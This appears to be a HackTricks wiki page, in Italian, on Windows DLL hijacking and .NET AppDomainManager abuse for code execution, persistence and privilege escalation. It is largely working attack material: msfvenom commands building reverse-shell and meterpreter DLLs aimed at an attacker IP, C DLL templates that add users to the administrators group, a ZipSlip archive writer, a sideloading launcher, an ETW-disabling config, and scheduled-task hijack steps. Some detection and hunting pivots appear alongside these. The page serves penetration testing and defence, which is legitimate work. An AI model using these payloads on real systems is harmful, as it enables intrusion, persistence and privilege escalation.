# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking implica manipolare un'applicazione affidabile affinché carichi una DLL malevola. Questo termine include varie tattiche come **DLL Spoofing, Injection, and Side-Loading**. Viene usato soprattutto per code execution, per ottenere persistence e, meno spesso, per privilege escalation. Nonostante qui il focus sia sull'escalation, il metodo di hijacking resta lo stesso per tutti gli obiettivi.

### Common Techniques

Per il DLL hijacking si usano diversi metodi, ognuno con efficacia diversa a seconda della strategia di caricamento delle DLL dell'applicazione:

1. **DLL Replacement**: sostituire una DLL legittima con una malevola, eventualmente usando DLL Proxying per mantenere la funzionalità originale della DLL.
2. **DLL Search Order Hijacking**: inserire la DLL malevola in un percorso di ricerca prima di quella legittima, sfruttando il pattern di ricerca dell'applicazione.
3. **Phantom DLL Hijacking**: creare una DLL malevola che l'applicazione carica, credendo che sia una DLL richiesta ma inesistente.
4. **DLL Redirection**: modificare parametri di ricerca come `%PATH%` o file `.exe.manifest` / `.exe.local` per indirizzare l'applicazione verso la DLL malevola.
5. **WinSxS DLL Replacement**: sostituire la DLL legittima con una controparte malevola nella directory WinSxS, un metodo spesso associato a DLL side-loading.
6. **Relative Path DLL Hijacking**: inserire la DLL malevola in una directory controllata dall'utente insieme all'applicazione copiata, simile alle tecniche di Binary Proxy Execution.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Il classico DLL sideloading non è l'unico modo per far caricare codice dell'attaccante a un processo affidabile **.NET Framework**. Se l'eseguibile target è un'applicazione **managed**, il CLR consulta anche un **application configuration file** chiamato come l'eseguibile (per esempio `Setup.exe.config`). Quel file può definire un **AppDomainManager** personalizzato. Se il config punta a un assembly controllato dall'attaccante posizionato accanto all'EXE, il CLR lo carica **prima del normale flusso di codice dell'applicazione** ed esegue all'interno del processo affidabile.

Secondo lo schema di configurazione di .NET Framework di Microsoft, sia `<appDomainManagerAssembly>` sia `<appDomainManagerType>` devono essere presenti perché venga usato il manager personalizzato.

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Minimal manager:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Note pratiche:
- Questo è tradecraft specifico di **.NET Framework**. Dipende dal parsing della configurazione del CLR, non dall'ordine di ricerca delle DLL di Win32.
- L'host deve essere davvero un **managed EXE**. Triage rapido: `sigcheck -m target.exe`, `corflags target.exe`, oppure controlla il **CLR Runtime Header** nei metadata PE.
- Il filename della config deve corrispondere esattamente al nome dell'eseguibile (`<binary>.config`) e di solito si trova **accanto all'EXE**.
- Questo è utile con **signed Microsoft/vendor binaries** perché l'EXE trusted rimane intatto mentre il malicious managed assembly viene eseguito in-process.
- Se hai già una directory di installer/update scrivibile, l'AppDomainManager hijacking può essere usato come **first stage**, seguito da classic DLL sideloading o reflective loading per le fasi successive.

### AppDomainManager come downloader + scheduled-task bootstrap

Un pattern di intrusione pratico è abbinare il trusted managed EXE sia a un malicious `*.config` sia a un malicious AppDomainManager DLL che funge solo da **piccolo bootstrapper**:

1. L'utente avvia un signed .NET installer o updater da una posizione credibile come `%USERPROFILE%\Downloads`.
2. La config adiacente fa sì che il CLR carichi l'assembly dell'attaccante **prima** che inizi la logica legittima dell'app.
3. Il malicious manager esegue un **path gate** (per esempio, continua solo se l'host EXE è in esecuzione da `Downloads`, e consente al second stage di girare solo da `%LOCALAPPDATA%`).
4. Se il controllo passa, scarica il payload reale in un percorso scrivibile dall'utente come `%LOCALAPPDATA%\PerfWatson2.exe` e installa la persistence con un scheduled task.

Perché questa variante è importante:
- L'host EXE signed resta invariato, quindi un triage che fa hash solo del binary principale può perdere la compromissione.
- La semplice **path-based anti-analysis** è comune: spostare il trio ZIP/EXE/DLL su Desktop, Temp o un path sandbox può rompere intenzionalmente la catena.
- Il AppDomainManager DLL di first stage può restare piccolo e a basso rumore mentre il vero implant viene recuperato più tardi.

Esempio minimo di persistence spesso visto con questo pattern:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Note:
- ` /rl highest` significa **più elevato disponibile** per quell'utente/sessione; non è di per sé un'escalation garantita a SYSTEM.
- Questa tecnica è spesso meglio classificata come **execution/persistence via .NET config abuse** anziché come classico DLL hijacking per search-order mancante, anche se gli operatori spesso le concatenano entrambe.

Detection pivots:
- Eseguibili .NET firmati avviati da percorsi di **estrazione ZIP**, `Downloads`, `%TEMP%` o altre cartelle scrivibili dall'utente con un `<exe>.config` **colocato**.
- Nuove scheduled tasks la cui action punta a `%LOCALAPPDATA%`, `%APPDATA%` o `Downloads` e i cui nomi imitano updater di browser/vendor.
- Processi managed bootstrap di breve durata che scaricano subito un altro EXE, poi avviano `schtasks.exe`.
- Campioni che escono presto a meno che il percorso dell'eseguibile non corrisponda a una directory prevista del profilo utente.

### Hijacking an existing scheduled task to relaunch the sideload chain

Per la persistence, non cercare solo la **creazione di una nuova task**. Alcuni intrusion set aspettano che un installer legittimo crei una **normal updater task** e poi **riscrivono l'azione della task** in modo che il nome esistente, l'autore e il trigger restino familiari ai defender.

Reusable workflow:
1. Installa/esegui il software legittimo e identifica la task che crea normalmente.
2. Esporta il task XML e annota i valori correnti di `<Exec><Command>` / `<Arguments>`.
3. Sostituisci solo l'azione in modo che la task avvii il tuo **trusted host EXE** da una directory di staging scrivibile dall'utente, che poi esegue side-load o AppDomain-load del payload reale.
4. Registra di nuovo lo stesso nome della task invece di creare un nuovo artefatto di persistence evidente.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Perché è più stealth:
- Il nome del task può sembrare ancora legittimo (per esempio un vendor updater).
- Il **Task Scheduler service** lo avvia, quindi la validazione di parent/ancestor spesso vede la catena di scheduling attesa invece di `explorer.exe`.
- I team DFIR che cercano solo **nuovi task names** possono perdere un task la cui registrazione esisteva già ma la cui action ora punta a `%LOCALAPPDATA%`, `%APPDATA%` o a un altro path controllato dall'attaccante.

Pivoti rapidi di hunting:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Confronta i metadati XML di `C:\Windows\System32\Tasks\*` e `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` con un baseline.
- Genera alert quando un **vendor-looking updater task** esegue da **user-writable directories** o avvia un EXE .NET con un file `*.config` collocato insieme.

> [!TIP]
> Per una catena passo-passo che combina HTML staging, configurazioni AES-CTR e implant .NET sopra il DLL sideloading, rivedi il workflow qui sotto.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

Il modo più comune per trovare Dlls mancanti in un sistema è eseguire [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) di sysinternals, **impostando** i **seguenti 2 filtri**:

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

e mostrando solo la **File System Activity**:

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

Se stai cercando **missing dlls in generale** lascia questa raccolta in esecuzione per alcuni **secondi**.\
Se stai cercando una **missing dll dentro un eseguibile specifico** devi impostare **un altro filtro come "Process Name" "contains" `<exec name>`, eseguirlo e fermare la cattura degli eventi**.

## Exploiting Missing Dlls

Per elevare i privilegi, la migliore possibilità che abbiamo è riuscire a **scrivere una dll che un processo privilegiato tenterà di caricare** in un punto in cui verrà cercata. Quindi, potremo **scrivere** una dll in una **cartella** dove la **dll viene cercata prima** della cartella in cui si trova la **dll originale** (caso particolare), oppure potremo **scrivere** in una cartella dove la dll verrà cercata e la **dll originale** non esiste in nessuna cartella.

### Dll Search Order

**Dentro la** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **puoi trovare come vengono caricate specificamente le Dlls.**

Le **Windows applications** cercano le DLL seguendo un insieme di **pre-defined search paths**, rispettando una sequenza precisa. Il problema del DLL hijacking nasce quando una DLL malevola viene collocata strategicamente in una di queste directory, assicurando che venga caricata prima della DLL autentica. Una soluzione per prevenire questo problema è fare in modo che l'applicazione usi path assoluti quando fa riferimento alle DLL di cui ha bisogno.

Puoi vedere il **DLL search order on 32-bit** systems qui sotto:

1. La directory da cui è stata caricata l'applicazione.
2. La system directory. Usa la funzione [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) per ottenere il path di questa directory.(_C:\Windows\System32_)
3. La 16-bit system directory. Non esiste una funzione che ottenga il path di questa directory, ma viene cercata. (_C:\Windows\System_)
4. La Windows directory. Usa la funzione [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) per ottenere il path di questa directory.
1. (_C:\Windows_)
5. La directory corrente.
6. Le directory elencate nella variabile di ambiente PATH. Nota che questo non include il path per-applicazione specificato dalla chiave di registro **App Paths**. La chiave **App Paths** non viene usata quando si calcola il percorso di ricerca delle DLL.

Questo è l'ordine di ricerca **predefinito** con **SafeDllSearchMode** abilitato. Quando è disabilitato, la directory corrente sale al secondo posto. Per disabilitare questa funzione, crea il valore di registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** e impostalo a 0 (il default è abilitato).

Se la funzione [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) viene chiamata con **LOAD_WITH_ALTERED_SEARCH_PATH**, la ricerca inizia nella directory del modulo eseguibile che **LoadLibraryEx** sta caricando.

Infine, nota che **una dll può essere caricata indicando il path assoluto invece del solo nome**. In quel caso quella dll verrà **cercata solo in quel path** (se la dll ha dipendenze, queste verranno cercate come se fossero state caricate semplicemente per nome).

Ci sono altri modi per modificare l'ordine di ricerca, ma non li spiegherò qui.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Usa i filtri di **ProcMon** (`Process Name` = target EXE, `Path` termina con `.dll`, `Result` = `NAME NOT FOUND`) per raccogliere i nomi delle DLL che il processo prova a caricare ma non trova.
2. Se il binary gira su una **schedule/service**, depositare una DLL con uno di quei nomi nella **application directory** (search-order entry #1) verrà caricata alla prossima esecuzione. In un caso con scanner .NET, il processo cercava `hostfxr.dll` in `C:\samples\app\` prima di caricare la copia reale da `C:\Program Files\dotnet\fxr\...`.
3. Costruisci una payload DLL (per esempio reverse shell) con qualsiasi export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Se la tua primitive è un **ZipSlip-style arbitrary write**, crea uno ZIP la cui entry esca dalla extraction dir così che la DLL finisca nella cartella dell'app:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Consegnare l'archivio alla inbox/share monitorata; quando il scheduled task riavvia il processo, carica la DLL malevola ed esegue il tuo codice come account del servizio.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Un modo avanzato per influenzare in modo deterministico il DLL search path di un processo appena creato è impostare il campo DllPath in RTL_USER_PROCESS_PARAMETERS quando si crea il processo con le ntdll native APIs. Fornendo qui una directory controllata dall'attaccante, un processo target che risolve una imported DLL per nome (senza absolute path e senza usare i safe loading flags) può essere forzato a caricare una DLL malevola da quella directory.

Key idea
- Build the process parameters with RtlCreateProcessParametersEx and provide a custom DllPath that points to your controlled folder (e.g., the directory where your dropper/unpacker lives).
- Create the process with RtlCreateUserProcess. When the target binary resolves a DLL by name, the loader will consult this supplied DllPath during resolution, enabling reliable sideloading even when the malicious DLL is not colocated with the target EXE.

Notes/limitations
- This affects the child process being created; it is different from SetDllDirectory, which affects the current process only.
- The target must import or LoadLibrary a DLL by name (no absolute path and not using LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs and hardcoded absolute paths cannot be hijacked. Forwarded exports and SxS may change precedence.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Esempio di utilizzo operativo
- Place a malicious xmllite.dll (esportando le funzioni richieste o facendo proxy verso quella reale) nella tua directory DllPath.
- Avvia un binary firmato noto per cercare xmllite.dll per nome usando la tecnica sopra. Il loader risolve l'import tramite il DllPath fornito e sideloads la tua DLL.

Questa tecnica è stata osservata in-the-wild per guidare catene di sideloading multi-stage: un launcher iniziale rilascia una helper DLL, che poi avvia un binary Microsoft-signed, hijackable con un DllPath personalizzato per forzare il caricamento della DLL dell'attaccante da una directory di staging.


### .NET AppDomainManager hijacking via `.exe.config`

Per target **.NET Framework**, il sideloading può essere fatto **prima di `Main()`** senza patching della memoria abusando del file **`.exe.config`** adiacente dell'applicazione. Invece di fare affidamento solo sull'ordine di ricerca delle DLL Win32, l'attaccante mette un .NET EXE legittimo accanto a una config malevola e a una o più assembly controllate dall'attaccante.

Come funziona la chain:
1. L'host EXE si avvia e il **CLR legge `<exe>.config`**.
2. La config imposta **`<appDomainManagerAssembly>`** e **`<appDomainManagerType>`** così che il runtime instanzi un **AppDomainManager** controllato dall'attaccante.
3. Il manager malevolo ottiene esecuzione **pre-`Main()`** dentro il trusted host process.
4. La stessa config può forzare il CLR a risolvere prima le assembly locali (per esempio `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) e può indebolire la validazione/telemetria del runtime senza inline patching.

Pattern in stile campaign (l'annidamento esatto può variare in base al directive / alla versione CLR):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Perché è utile:
- **`<probing privatePath="."/>`** mantiene la resolution dell'assembly nella directory dell'applicazione, trasformando la cartella in una superficie di sideloading prevedibile.
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** spostano l'esecuzione nel codice attacker durante l'inizializzazione del CLR, prima che parta la logica legittima dell'app.
- **`<bypassTrustedAppStrongNames enabled="true"/>`** può consentire a un'app full-trust di caricare assembly non firmati o alterati senza un failure di validazione strong-name.
- **`<publisherPolicy apply="no"/>`** evita i redirect di publisher-policy verso assembly più nuovi.
- **`<requiredRuntime ... safemode="true"/>`** rende la selezione del runtime più deterministica.
- **`<etwEnable enabled="false"/>`** è particolarmente interessante perché il **CLR disabilita la propria visibilità ETW** dalla configurazione invece che l'implant patchi `EtwEventWrite` in memoria.

Pattern operativo visto in campagne recenti:
- La Stage 1 deposita `setup.exe`, `setup.exe.config` e assembly locali.
- La Stage 2 li copia in una cartella **AppData update** credibile, rinomina l'host in qualcosa come `update.exe` e lo rilancia tramite una **scheduled task**.
- La Stage 3 verifica il contesto di esecuzione (per esempio il parent atteso `svchost.exe` da Task Scheduler) prima di caricare il DLL/export finale del RAT.

Idee di hunting:
- **.NET executables** firmati o comunque legittimi che girano con sospetti file **`.config`** adiacenti in percorsi scrivibili dall'utente.
- File `.config` che contengono **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** o **`etwEnable enabled="false"`**.
- Scheduled task che rilanciano binary di update rinominati da **`%LOCALAPPDATA%`** o da directory specifiche dell'app come `\bin\update\`.
- Catene parent/child in cui una scheduled task avvia un host .NET fidato che carica immediatamente assembly non del vendor dalla propria directory.

#### Exceptions on dll search order from Windows docs

Alcune eccezioni al normale ordine di ricerca delle DLL sono indicate nella documentazione Windows:

- Quando si incontra una **DLL che condivide il nome con una già caricata in memory**, il sistema bypassa la ricerca standard. Invece, esegue un controllo per redirection e un manifest prima di usare la DLL già in memory. **In questo scenario, il sistema non esegue una search per la DLL**.
- Nei casi in cui la DLL viene riconosciuta come una **known DLL** per la versione corrente di Windows, il sistema utilizzerà la sua versione della known DLL, insieme a tutte le DLL dipendenti, **saltando il processo di search**. La chiave di registro **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contiene l'elenco di queste known DLL.
- Se una **DLL ha dipendenze**, la search di queste DLL dipendenti viene eseguita come se fossero indicate solo tramite i loro **module names**, indipendentemente dal fatto che la DLL iniziale sia stata identificata tramite un full path.

### Escalating Privileges

**Requirements**:

- Identificare un processo che opera o opererà con **privilegi diversi** (horizontal o lateral movement), che **non ha una DLL**.
- Assicurarsi che sia disponibile l'**accesso in scrittura** per qualsiasi **directory** in cui la **DLL** verrà **cercata**. Questa posizione può essere la directory dell'eseguibile oppure una directory nel system path.

Sì, i requisiti sono complicati da trovare perché **di default è un po' strano trovare un eseguibile privilegiato a cui manca una dll** ed è ancora **più strano avere permessi di scrittura su una cartella del system path** (di default non puoi). Ma in ambienti misconfigurati è possibile.\
Se sei fortunato e ti trovi a soddisfare i requisiti, puoi controllare il progetto [UACME](https://github.com/hfiref0x/UACME). Anche se il **main goal del progetto è bypass UAC**, lì potresti trovare un **PoC** di Dll hijaking per la versione Windows che puoi usare (probabilmente cambiando solo il path della cartella in cui hai i permessi di scrittura).

Nota che puoi **verificare i tuoi permessi in una cartella** facendo:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
E **controlla i permessi di tutte le cartelle all'interno di PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Puoi anche controllare gli import di un eseguibile e gli export di una dll con:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Per una guida completa su come **abuse Dll Hijacking per escalare i privilegi** con permessi di scrittura in una cartella **System Path** controlla:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)controllerà se hai permessi di scrittura su qualsiasi cartella all'interno del system PATH.\
Altri interesting automated tools per scoprire questa vulnerability sono le funzioni di **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ e _Write-HijackDll._

### Example

Nel caso tu trovi uno scenario exploitable, una delle cose più importanti per exploitare con successo sarebbe **creare una dll che esporti almeno tutte le functions che l'executable importerà da essa**. In ogni caso, nota che Dll Hijacking è molto utile per [escalare da Medium Integrity level a High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) o da [**High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Puoi trovare un esempio di **come creare una valid dll** all'interno di questo studio su dll hijacking focalizzato su dll hijacking per execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Inoltre, nella **next section** puoi trovare alcuni **basic dll codes** che potrebbero essere utili come **templates** o per creare una **dll con non required functions exported**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

In sostanza una **Dll proxy** è una Dll capace di **execute your malicious code when loaded** ma anche di **expose** e **work** come **exected** facendo da **relay di tutte le calls alla real library**.

Con lo strumento [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) o [**Spartacus**](https://github.com/Accenture/Spartacus) puoi effettivamente **indicare un executable e selezionare la library** che vuoi proxify e **generate a proxified dll** oppure **indicare la Dll** e **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Ottieni un meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Creare un utente (x86 non ho visto una versione x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Il tuo

Nota che in diversi casi il Dll che compili deve **esportare diverse funzioni** che verranno caricate dal processo vittima, se queste funzioni non esistono il **binary non sarà in grado di caricarle** e l'**exploit fallirà**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Esempio C++ DLL con creazione di utente</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL C alternativo con thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Caso di studio: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe continua a verificare all’avvio una DLL di localizzazione prevedibile e specifica per lingua, che può essere hijacked per esecuzione arbitraria di codice e persistenza.

Key facts
- Percorso di probe (build attuali): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Percorso legacy (build precedenti): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Se esiste una DLL scrivibile controllata dall’attaccante nel percorso OneCore, viene caricata ed esegue `DllMain(DLL_PROCESS_ATTACH)`. Non sono richiesti export.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Avvia Narrator e osserva il tentativo di caricamento del percorso sopra.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silenzio
- Un hijack ingenuo parlerà/evidenzierà la UI. Per restare silenziosi, all’attach enumera i thread di Narrator, apri il main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) e usa `SuspendThread` su di esso; continua nel tuo thread. Vedi il PoC per il codice completo.

Trigger e persistence tramite configurazione Accessibility
- Contesto utente (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Con quanto sopra, avviare Narrator carica la DLL piantata. Sul secure desktop (logon screen), premi CTRL+WIN+ENTER per avviare Narrator; la tua DLL viene eseguita come SYSTEM sul secure desktop.

Esecuzione SYSTEM attivata via RDP (lateral movement)
- Consenti il classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Connettiti via RDP all'host, alla schermata di logon premi CTRL+WIN+ENTER per avviare Narrator; la tua DLL viene eseguita come SYSTEM sul secure desktop.
- L'esecuzione si interrompe quando la sessione RDP si chiude—inietta/migra prontamente.

Bring Your Own Accessibility (BYOA)
- Puoi clonare una voce di registro di un Accessibility Tool (AT) integrato (per esempio, CursorIndicator), modificarla per puntare a un binario/DLL arbitrario, importarla, poi impostare `configuration` su quel nome AT. Questo fa da proxy all'esecuzione arbitraria sotto il framework Accessibility.

Note
- Scrivere sotto `%windir%\System32` e modificare i valori HKLM richiede privilegi admin.
- Tutta la logica del payload può vivere in `DLL_PROCESS_ATTACH`; non servono export.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Questo caso dimostra **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracciato come **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` situato in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` viene eseguito ogni giorno alle 9:30 AM nel contesto dell'utente connesso.
- **Directory Permissions**: Scrivibile da `CREATOR OWNER`, consentendo agli utenti locali di depositare file arbitrari.
